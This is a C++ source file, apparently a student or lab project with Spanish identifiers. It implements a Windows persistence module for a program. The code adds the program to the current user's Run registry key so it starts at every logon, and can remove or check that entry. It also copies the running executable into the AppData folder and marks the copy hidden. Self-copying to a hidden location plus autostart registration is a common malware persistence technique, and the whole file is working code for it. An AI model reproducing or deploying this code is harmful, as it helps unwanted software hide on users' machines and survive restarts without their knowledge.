//Juan Angel Rodríguez Bulnes
#include "Persist.h"
#include <iostream>
#include <filesystem>
#include <shlobj.h>


bool Persist::establecerPersistencia(const std::string& nombreEjecutable, const std::string& rutaEjecutable) {
    HKEY hKey;
    LONG resultado;
    std::string subclave = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    
    resultado = RegOpenKeyExA(HKEY_CURRENT_USER, 
                             subclave.c_str(), 
                             0, 
                             KEY_WRITE, 
                             &hKey);
    
    if (resultado != ERROR_SUCCESS) {
        resultado = RegCreateKeyExA(HKEY_CURRENT_USER,
                                   subclave.c_str(),
                                   0,
                                   NULL,
                                   REG_OPTION_NON_VOLATILE,
                                   KEY_WRITE,
                                   NULL,
                                   &hKey,
                                   NULL);
        
        if (resultado != ERROR_SUCCESS) {
            std::cerr << "Error al crear clave del registro: " << resultado << std::endl;
            return false;
        }
    }
    
    resultado = RegSetValueExA(hKey,
                              nombreEjecutable.c_str(),
                              0,
                              REG_SZ,
                              (const BYTE*)rutaEjecutable.c_str(),
                              rutaEjecutable.length() + 1);
    
    RegCloseKey(hKey);
    
    if (resultado != ERROR_SUCCESS) {
        std::cerr << "Error al establecer valor en registro: " << resultado << std::endl;
        return false;
    }
    
    std::cout << "Persistencia establecida: " << nombreEjecutable << " -> " << rutaEjecutable << std::endl;
    return true;
}

bool Persist::eliminarPersistencia(const std::string& nombreEjecutable) {
    HKEY hKey;
    LONG resultado;
    std::string subclave = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    
    resultado = RegOpenKeyExA(HKEY_CURRENT_USER, 
                             subclave.c_str(), 
                             0, 
                             KEY_WRITE, 
                             &hKey);
    
    if (resultado != ERROR_SUCCESS) {
        std::cerr << "Error al abrir clave del registro: " << resultado << std::endl;
        return false;
    }
    
    resultado = RegDeleteValueA(hKey, nombreEjecutable.c_str());
    RegCloseKey(hKey);
    
    if (resultado != ERROR_SUCCESS) {
        if (resultado == ERROR_FILE_NOT_FOUND) {
            std::cout << "La persistencia no estaba establecida" << std::endl;
            return true;
        }
        std::cerr << "Error al eliminar valor del registro: " << resultado << std::endl;
        return false;
    }
    
    std::cout << "Persistencia eliminada: " << nombreEjecutable << std::endl;
    return true;
}

bool Persist::verificarPersistencia(const std::string& nombreEjecutable) {
    HKEY hKey;
    LONG resultado;
    std::string subclave = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    
    resultado = RegOpenKeyExA(HKEY_CURRENT_USER, 
                             subclave.c_str(), 
                             0, 
                             KEY_READ, 
                             &hKey);
    
    if (resultado != ERROR_SUCCESS) {
        return false;
    }
    
    char buffer[MAX_PATH];
    DWORD bufferSize = sizeof(buffer);
    resultado = RegQueryValueExA(hKey,
                                nombreEjecutable.c_str(),
                                NULL,
                                NULL,
                                (LPBYTE)buffer,
                                &bufferSize);
    
    RegCloseKey(hKey);
    
    return (resultado == ERROR_SUCCESS);
}

std::string Persist::obtenerRutaAPPDATA() {
    char appDataPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath) == S_OK) {
        return std::string(appDataPath);
    }
    return "";
}

bool Persist::copiarEjecutable(const std::string& rutaActual, const std::string& nombreDestino) {
    std::string rutaAPPDATA = obtenerRutaAPPDATA();
    if (rutaAPPDATA.empty()) {
        std::cerr << "Error: No se pudo obtener la ruta de APPDATA" << std::endl;
        return false;
    }
    
    std::string rutaDestino = rutaAPPDATA + "\\" + nombreDestino;
    
    if (CopyFileA(rutaActual.c_str(), rutaDestino.c_str(), FALSE)) {
        std::cout << "Ejecutable copiado a: " << rutaDestino << std::endl;
        
        SetFileAttributesA(rutaDestino.c_str(), FILE_ATTRIBUTE_HIDDEN);
        
        return true;
    } else {
        std::cerr << "Error al copiar ejecutable: " << GetLastError() << std::endl;
        return false;
    }

}
